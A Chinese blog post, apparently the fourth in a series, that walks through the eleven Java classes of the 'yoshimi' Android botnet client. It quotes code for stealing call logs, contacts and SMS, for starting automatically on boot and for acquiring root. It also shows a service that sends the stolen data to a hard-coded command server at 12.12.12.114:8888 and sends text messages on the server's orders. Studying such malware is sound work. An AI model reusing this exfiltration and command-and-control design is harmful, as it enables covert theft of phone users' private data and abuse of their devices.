@@ -1,0 +1,179 @@
+第一个App，是对yoshimi的深度认识。不先学习别人的app，怎么能写好自己的app呢？
+
+这里关于yoshimi的第四篇博文。
+在yoshimi的源代码中，一种有11个类，下面逐一细读这11个java类。
+
+############################################
+123是载体类。
+第一个从最简单的对象开始-ContactsList:
+这是用于存储手机电话簿联系人信息的类。
+它有三个属性，都是string类型，分别为phoneNumber,contactName,contactEmail；对应这三个属性对应了三对儿存(set)取(get)方法；一个空的构造函数；
+另外的一个方法函数是getJsonObject()，其中涉及到JSON，它是一种轻量级的数据交换格式。在此方法中创建了一个JSON对象，并把ContactsList的三个属性加了进来，随后将其输出和返回。
+
+############################################
+第二个对象-SMSList
+这是用于存储短信的类。
+它有六个属性，都是string类型，分别为phoneNumber,contactName,messageDate,messageType,messageBody,messageRead；同样对应六对儿存(set)取(get)方法；一个空的构造函数；
+同样也有一个方法函数是getJsonObject()，创建了一个JSON对象，并把SMSList的6个属性加了进来，随后返回，并没有输出出来。
+
+############################################
+第三个对象-RecentCall同上也一样，不细说了。
+
+############################################
+4567是方法类。
+第四个对象-SQLite
+这是一个负责数据库操作的类。
+它继承自抽象类android.database.sqlite.SQLiteOpenHelper。有5个全局常量属性，前三个是配置数据，TAG,DATABASE_NAME,DATABASE_VERSION，另外两个全局常量是两条SQL语句。创建了两个table:storage和version。还有一个属性是string类型的变量，uuid，它在本项目中貌似是相当于一个手机设备的id标识。
+<!--more-->
+SQLite的构造函数利用父类的构造函数创建了数据库，其原型如下：
+SQLiteOpenHelper(Context context, String name, SQLiteDatabase.CursorFactory factory, int version)
+在此我们的第二参数和第四参数为DATABASE_NAME,DATABASE_VERSION。
+此外，还有两个继承SQLiteOpenHelper的方法：
+onCreate(SQLiteDatabase)在数据库产生时调用，一般是在此创建数据库的表。在此项目中，执行了创建storage和version两个表的sql操作，生成了随机的uuid。并且，将uuid插入到了storage表中。
+onUpdate(SQLiteDatabase, int, int)当数据库需要升级的时候，Android系统会主动调用此函数，一般在此删除数据库的表，并创建新的表。不过在此项目中什么都没做。
+
+############################################
+第五个对象-Http
+这是一个负责http连接服务器端的类。
+它有2个string类型的全局常量属性，TAG和HEADER，都没什么大用处。
+此类中GET和POST方法的设计在之前的一篇博文《yoshimi-一个值得研究学习的Android-Botnet》中有介绍。
+方法函数public static String GET(String uri, String uuid)，由uri和uuid构建GET请求，得到响应response转换为string类型作为函数返回值。
+另一个public static String POST(String uri, String uuid, List<NameValuePair> parameters)，多了一个List类型的parameters参数，这也是post和get方法的区别。得到响应response转换为string类型作为函数返回值。
+方法函数String httpResponseToString(HttpResponse response)把HttpResponse类型数据转换为String类型。
+
+############################################
+第六个对象-APIInteraction
+这个类在项目中负责与硬件设备交互，从设备中获取用户信息。因此会调用一些android的API函数。所以类名也起作“API交互”。
+类中没有属性；6个方法函数，分别获取6种手机信息（calls,contactname,contacts,emailcontacts,phonenumbers,sms）
+所有的方法都如public static Cursor retrieveXXX(Context act)。下面是必要API介绍：
+-android.database.Cursor用于处理SQLIte数据库数据。
+-android.provider.CallLog.Calls对象中存储着手机的通话记录，其中的重要属性，NUMBER是电话号，TYPE是通话类型（如去电、已接、未接）,CACHED_NAME是联系人姓名,CACHED_NUMBER_TYPE是号码类型（如宅电、单位等）。
+-android.provider.ContactsContract.Contacts对象中存储手机的电话簿原始数据。
+-android.provider.ContactsContract.CommonDataKinds中存储的是便于访问的电话簿信息，其中常用的有Phone,Email。
+-android.net.Uri.parse(String uriString)可以将string类型的uri解析为真正的URI。
+-android.content.Context对象的getContentResolver()方法获得ContentProvider对象，该对象实现了程序的数据共享，它是通过URI来查询(.query()方法)其中的数据。
+
+因此APIInteraction对象的方法Cursor retrieveXXX(Context act)函数是都从Context中提取用户数据传递给Cursor。
+
+############################################
+第七个对象-StealData
+这个类在APIInteraction类的上级，顾名思义是窃取数据的。
+public static RecentCall[] getCalls(Context act)由Context获得RecentCall对象的数组。
+public static ContactsList[] getContacts(Context act)由Context获得ContactsList对象的数组。
+public statci SMSList[] getSMSMessages(Context act)由Context获得SMSList对象的数组。
+
+
+############################################
+第八个对象-console
+这是一个activity，负责呈现用户视图的类。
+继承自android.app.Activity，重载了onCreate方法，其大致工作过程如下：
+[code]
+setContentView(R.layout.console);//由布局资源获取视图
+TextView console = (TextView)findViewById(R.id.consoleText);//创建文本视图
+console.setText("初始显示的文本内容")；
+console.append("增加的文本内容");
+
+Context currentContext = getBaseContext()；//获取当前的Context
+
+//得到当前Context之后就要从中窃取数据了。
+RecentCall[] calls = StealData.getCalls(currentContext);
+//调用StealData对象的方法来窃取数据，并将其输出到console
+[/code]
+
+
+############################################
+第九个对象-MainActivity
+这是主activity，就是程序刚打开是显示的视图，其作用就是开个头然后引出console视图。
+继承自android.app.Activity，重载了onCreate方法，其大致工作如下：
+[code]
+//这里设计了一个“欢迎界面”。
+setContentView(R.layout.splash);//由布局资源获取视图
+//随后创建了console视图。
+android.app.Activity.startActivity(new Intent("yoshimo.console"));
+
+//在当前应用程序的Context下实例化YoshimiService对象。
+Intent myIntent = new Intent(getApplicationContext(), YoshimiService.class);
+//开始YoshimiService对象的service
+startService(myIntent);
+[/code]
+
+
+############################################
+第十个对象-SystemBootReceiver
+它继承自android.content.BroadcastsReceiver类，这个类是用来接受和相应发送过来的广播Intent。
+这里重载了onReceiver方法，当接收到接收到广播Intent的时候，开启YoshimiService。
+为什么SystemBootReceiver里又要设计一次service的开启？显而易见，我们需要程序再手机重启后能自动启动。怎么设计应用程序的开机自动启动呢？
+因为在AndroidManifest.xml中，设计了1个receiver用于监听SystemBootReceiver。
+[code]
+<receiver android:name="yoshimi.SystemBootReceiver">
+<intent-filter>
+<action android:name="android.intent.action.BOOT_COMPLETED"/>
+</intent-filter>
+</receiver>
+[/code]
+这里我目前理解的不透，不知道怎么说receiver与action的关系。android系统定义了一些标准的Broadcast Action来响应系统的广播事件。
+
+
+############################################
+第十一个对象-YoshimiService
+最后一个，也是最重要的一个类，Service，负责整个程序的后台运作，在这里可以看到该应用程序的整个工作流程。继承自android.app.Service类。
+其属性全部是私有属性：
+1. SQLite对象（第四个对象），
+2. java.lang.Process对象，这个类提供了执行从进程输入、执行输出到进程、等待进程完成、检查进程的退出状态以及销毁进程的方法。
+3. uuid，是string类型。
+其方法函数有：
+1. 重载onCreate：为程序获取root权限，从SQLite中读取uuid（虽然它是在SQLite实例化时随机生成的）
+[code]
+//SQLite的查询语句这么设计，先写好查询语句
+String query = "select * from storage where name = ?";
+//再查询，把结果返回给cursor
+Cursor cursor = sqlite.getReadableDatabase().rawQuery(query, new String[] {"uuid"});
+[/code]
+
+2.重载onStartCommand：这个函数会在创建Service之后显式调用startService()的时候执行。
+这里利用Http对象发起http连接，向服务器端提交数据。
+[code]
+//先向服务器端发一个报告。告知我的存在。
+//发起GET请求，这里的uuid在初始化service对象时得到了。得到响应。
+String getResponse = Http.GET("http://12.12.12.114:8888/bot/hello",uuid)
+//获取设备基本信息。该函数返回一个List类型的存储信息。
+//android.os.Build对象存储着设备的系统信息。
+Lsit<NameValuePair> details = getVersionInformation()；
+//同样发起POST请求，将信息提交给服务器。
+String postResponse = Http.POST("http://12.12.12.114:8888/bot/version",uuid, details);
+//获取通话纪录。这里利用了StealData对象。
+List<NameValuePair> callInfo = getCallInfomation();
+//将其提交给服务器。
+postResponse = Http.POST("http://12.12.12.114:8888/bot/calls");
+
+//对于联系人数据也是类似的方法。
+//最后还要做一件事，就是接受和处理服务器端发来的commmand。
+String response = Http.GET("http://12.12.12.114:8888/bot/ping",uuid);
+//这时服务器端则会发回command。
+//如果响应的不是nop，就要处理command，否则什么也不做。
+if(!response.equals("nop"))
+//从响应数据response中提取command中的要求
+JSONObject command = new JSONObject(response);
+//如果command的操作为sms,意思是要使客户端发送指定的短信
+if(command.get("op").toString().equals("sms"))
+String phoneNumber = command.get("phone_number").toString();
+String message = command.get("message").toString();
+//这里的发短信需要android.telephony.SmsManager
+SmsManager smsManager = SmsManager.getDefault();
+smsManager.sendTextMessage(phoneNumber,null,message,null,null);
+
+//OK！命令执行完毕，最后再告诉服务器端一下。
+Http.GET("http://12.12.12.114:8888/bot/completed",uuid);
+[/code]
+
+由此我就知道，在Tornado那端的URL：
+/bot/hello对应的函数负责接受设备出现报告。
+/bot/version对应的函数负责处理收到的设备版本信息。
+/bot/calls对应的函数负责处理接收到的通话记录。
+/bot/ping对应的处理函数要向客户端发送命令。
+/bot/completed对应的函数接收客户端的命令执行报告。
+
+
+至此yoshimi客户端源代码看完，留下1点疑问：在服务器端对command是人工输入的，而客户端的一切流程都是自动顺序执行的。怎么做到两端在command工作上的同步？
+
+
